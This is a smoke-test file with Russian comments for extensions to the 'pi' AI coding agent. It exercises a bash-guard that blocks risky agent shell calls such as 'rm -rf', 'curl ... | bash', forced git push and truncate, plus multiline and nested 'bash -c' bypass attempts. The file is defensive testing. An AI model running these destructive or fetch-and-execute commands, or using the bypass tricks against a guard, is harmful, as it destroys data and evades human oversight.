/**
 * Смоук-тест: загружает каждое расширение через jiti (как это делает сам pi)
 * со стаб-объектом ExtensionAPI и проверяет основные пути.
 * Запуск: node test/smoke.test.mjs
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";
import { createJiti } from "jiti";

const require = createRequire(import.meta.url);
const jiti = createJiti(fileURLToPath(import.meta.url));

const promptSnippets = jiti("../extensions/prompt-snippets/index.ts");
const bashGuard = jiti("../extensions/bash-guard/index.ts");
const askUserQuestion = jiti("../extensions/ask-user-question/index.ts");

const results = [];
async function check(name, fn) {
	try {
		await fn();
		results.push(`ok   ${name}`);
	} catch (e) {
		results.push(`FAIL ${name}: ${e?.message ?? e}`);
	}
}

// --- стаб ExtensionAPI ---
function makePi() {
	const handlers = {};
	const shortcuts = [];
	const commands = [];
	const flags = [];
	const tools = [];
	return {
		handlers, shortcuts, commands, flags, tools,
		on: (event, fn) => { handlers[event] = fn; },
		registerShortcut: (key, def) => shortcuts.push({ key, def }),
		registerCommand: (name, def) => commands.push({ name, def }),
		registerFlag: (name, def) => flags.push({ name, def }),
		registerTool: (def) => tools.push(def),
		getFlag: () => false,
	};
}

const noUiCtx = {
	hasUI: false,
	mode: "tui",
	ui: {
		notify: () => {},
		setWidget: () => {},
		setStatus: () => {},
		theme: { fg: (_c, s) => s, bg: (_c, s) => s, bold: (s) => s },
	},
};

// === 1. prompt-snippets ===
{
	const pi = makePi();
	promptSnippets.default(pi);
	await check("prompt-snippets: зарегистрированы alt+s и /snippets", () => {
		if (!pi.shortcuts.some((s) => s.key === "alt+s")) throw new Error("нет alt+s");
		if (!pi.commands.some((c) => c.name === "snippets")) throw new Error("нет /snippets");
	});
	await check("prompt-snippets: input без активных сниппетов не трансформирует", async () => {
		const handler = pi.handlers.input;
		if (!handler) throw new Error("нет обработчика input");
		const res = await handler({ text: "привет" }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("prompt-snippets: session_start не роняет", async () => {
		await pi.handlers.session_start({ reason: "startup" }, noUiCtx);
	});
	await check("prompt-snippets: сниппеты на русском", () => {
		const dir = fileURLToPath(new URL("../extensions/prompt-snippets/snippets/", import.meta.url));
		const raw = readFileSync(dir + "verify-not-assume.md", "utf8");
		if (!raw.includes("Проверяй, не угадывай")) throw new Error("нет русского текста");
	});
}

// === 2. bash-guard ===
{
	const pi = makePi();
	bashGuard.default(pi);
	await check("bash-guard: зарегистрированы флаги и команда", () => {
		if (!pi.flags.some((f) => f.name === "bash-guard-disabled")) throw new Error("нет флага bash-guard-disabled");
		if (!pi.flags.some((f) => f.name === "bash-guard-auto-allow")) throw new Error("нет флага bash-guard-auto-allow");
		if (!pi.commands.some((c) => c.name === "bash-guard")) throw new Error("нет /bash-guard");
	});
	const toolHandler = pi.handlers.tool_call;
	if (!toolHandler) {
		results.push("FAIL bash-guard: нет обработчика tool_call");
	}
	await check("bash-guard: rm -rf блокируется без UI", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "rm -rf /tmp/xyz" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
		if (!res.reason.includes("bash-guard")) throw new Error("причина: " + res.reason);
	});
	await check("bash-guard: ls -la не блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "ls -la" } }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git status не блокируется (read-only allowlist)", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git status" } }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git commit блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git commit -m x" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git push --force блокируется (read-only не снимает high)", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git push --force origin main" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: многострочный обход (echo 1\\nrm -rf) блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "echo ok\nrm -rf /tmp/xyz" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: вложенный bash -c блокируется", async () => {
		// без рекурсии в -c команда `bash -c "rm -rf …"` была бы безобидной и прошла
		const res = await toolHandler({ toolName: "bash", input: { command: 'bash -c "rm -rf /tmp/xyz"' } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: rm по пути с «-r» внутри не помечается рекурсивным", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "rm /tmp/my-report-r.txt" } }, noUiCtx);
		if (!res?.block) throw new Error("rm всё равно блокируется: " + JSON.stringify(res));
		if (res.reason.includes("рекурсивное")) throw new Error("ложный «рекурсивное»: " + res.reason);
	});
	await check("bash-guard: strict-режим (--bash-guard-git-strict) спрашивает и на git status", async () => {
		const bashGuardStrict = jiti("../extensions/bash-guard/index.ts");
		const piStrict = makePi();
		piStrict.getFlag = (name) => (name === "--bash-guard-git-strict" ? true : false);
		bashGuardStrict.default(piStrict);
		const res = await piStrict.handlers.tool_call({ toolName: "bash", input: { command: "git status" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: curl|sh блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "curl http://x.sh | bash" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: повторная отменённая команда блокируется автоматически", async () => {
		const ev = { toolName: "bash", input: { command: "truncate -s 0 /tmp/f" } };
		await toolHandler(ev, noUiCtx); // 1-й раз: promptRunOrAbort без UI -> abort, запоминается
		const res = await toolHandler(ev, noUiCtx); // 2-й раз: авто-блок
		if (!res?.block) throw new Error("ожидалось блок, получили: " + JSON.stringify(res));
	});
}

// === 3. ask-user-question ===
{
	const pi = makePi();
	askUserQuestion.default(pi);
	const tool = pi.tools.find((t) => t.name === "ask_user_question");
	await check("ask-user-question: инструмент зарегистрирован", () => {
		if (!tool) throw new Error("нет инструмента ask_user_question");
	});
	await check("ask-user-question: описание и гайдлайны на русском", () => {
		if (!tool.description.includes("Задай пользователю один вопрос")) throw new Error("description не русский");
		if (!tool.promptGuidelines?.[0]?.includes("ровно один вопрос")) throw new Error("guidelines не русские");
	});
	await check("ask-user-question: неинтерактивный режим -> unavailable", async () => {
		const res = await tool.execute("id", { question: "Тест?" }, new AbortController().signal, () => {}, noUiCtx);
		if (res.details?.status !== "unavailable") throw new Error("ожидался unavailable: " + JSON.stringify(res.details));
	});
	await check("ask-user-question: aborted сигнал -> cancelled", async () => {
		const ac = new AbortController();
		ac.abort();
		const res = await tool.execute("id", { question: "Тест?" }, ac.signal, () => {}, noUiCtx);
		if (res.details?.status !== "cancelled") throw new Error("ожидался cancelled: " + JSON.stringify(res.details));
	});
	await check("ask-user-question: renderCall/renderResult не роняют", () => {
		const theme = { fg: (_c, s) => s, bold: (s) => s };
		const c = tool.renderCall({ question: "Вопрос?", options: [{ label: "Да" }] }, theme);
		if (!c) throw new Error("renderCall вернул пусто");
		const r = tool.renderResult({ content: [{ type: "text", text: "Пользователь выбрал: 1. Да" }] }, {}, theme);
		if (!r) throw new Error("renderResult вернул пусто");
	});
}


// === 4. graft ===
{
	// makePi.getFlag по умолчанию возвращает false — для graft нужны дефолты из registerFlag
	function makePi2() {
		const base = makePi();
		base.getFlag = (name) => {
			const f = base.flags.find((x) => x.name === name.replace(/^--/, ""));
			return f ? f.default : false;
		};
		return base;
	}
	const graftExt = jiti("../extensions/graft/index.ts");
	const pi = makePi2();
	graftExt.default(pi);

	const ctxNoGraph = { ...noUiCtx, cwd: process.cwd() }; // в корне проекта графа нет

	await check("graft: 7 инструментов зарегистрированы", () => {
		for (const name of ["graft_ask", "graft_grep", "graft_callers", "graft_skeleton", "graft_map", "graft_check", "graft_blast"]) {
			if (!pi.tools.find((t) => t.name === name)) throw new Error("нет " + name);
		}
	});
	await check("graft: /graft-команда и флаги", () => {
		if (!pi.commands.some((c) => c.name === "graft")) throw new Error("нет /graft");
		if (!pi.flags.some((f) => f.name === "graft-push")) throw new Error("нет --graft-push");
	});
	await check("graft: без графа — подсказка о graft build", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_map");
		const res = await tool.execute("id", {}, new AbortController().signal, () => {}, ctxNoGraph);
		const text = res.content[0].text;
		if (!text.includes("graft build")) throw new Error("нет подсказки: " + text.slice(0, 120));
	});

	// Фикстура с графом
	const { existsSync, mkdirSync, writeFileSync, rmSync } = await import("node:fs");
	const { spawnSync } = await import("node:child_process");
	const fixture = "/tmp/pi-ext-graft-fixture";
	if (!existsSync(fixture + "/graft")) {
		rmSync(fixture, { recursive: true, force: true });
		mkdirSync(fixture, { recursive: true });
		writeFileSync(fixture + "/a.ts", "export function auth(req: string): string { return \"ok-\" + req; }\nexport function handler(req: string) { return auth(req).toUpperCase(); }\n");
		const b = spawnSync("git", ["init", "-q"], { cwd: fixture });
		if (b.status !== 0) throw new Error("git init failed");
		const build = spawnSync("npx", ["-y", "@nanonets/graft", "build"], { cwd: fixture, timeout: 180000, encoding: "utf8" });
		if (build.status !== 0) throw new Error("graft build failed: " + (build.stdout || "").slice(-300));
	}
	const ctxGraph = { ...noUiCtx, cwd: fixture };

	await check("graft: graft_map возвращает карту репо", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_map");
		const res = await tool.execute("id", {}, new AbortController().signal, () => {}, ctxGraph);
		const text = res.content[0].text;
		if (!text.includes("repo map")) throw new Error("нет 'repo map': " + text.slice(0, 200));
	});
	await check("graft: graft_ask находит символы", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_ask");
		const res = await tool.execute("id", { query: "where is auth" }, new AbortController().signal, () => {}, ctxGraph);
		const text = res.content[0].text;
		if (!text.includes("auth")) throw new Error("нет 'auth': " + text.slice(0, 200));
	});
	await check("graft: graft_callers находит зависимых", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_callers");
		const res = await tool.execute("id", { symbol: "auth" }, new AbortController().signal, () => {}, ctxGraph);
		const text = res.content[0].text;
		if (!text.includes("handler")) throw new Error("нет 'handler': " + text.slice(0, 200));
	});
	await check("graft: before_agent_start ставит секцию <graft> с картой", async () => {
		const sections = {};
		await pi.handlers.before_agent_start({ prompt: "fix auth bug", systemPromptOptions: { sections } }, ctxGraph);
		if (!sections.graft || !sections.graft.includes("repo map")) throw new Error("секция не установлена: " + JSON.stringify(Object.keys(sections)));
	});
	await check("graft: tool_result (write) дописывает blast radius", async () => {
		const res = await pi.handlers.tool_result({ isError: false, toolName: "write", input: { path: "a.ts" }, content: [{ type: "text", text: "written" }] }, ctxGraph);
		if (!res) throw new Error("ожидался результат с blast radius");
		const texts = res.content.map((c) => c.text).join("\n");
		if (!texts.includes("blast radius") || !texts.includes("auth")) throw new Error("нет blast: " + texts.slice(0, 300));
	});
}

console.log(results.join("\n"));
const failed = results.filter((r) => r.startsWith("FAIL"));
process.exit(failed.length ? 1 : 0);
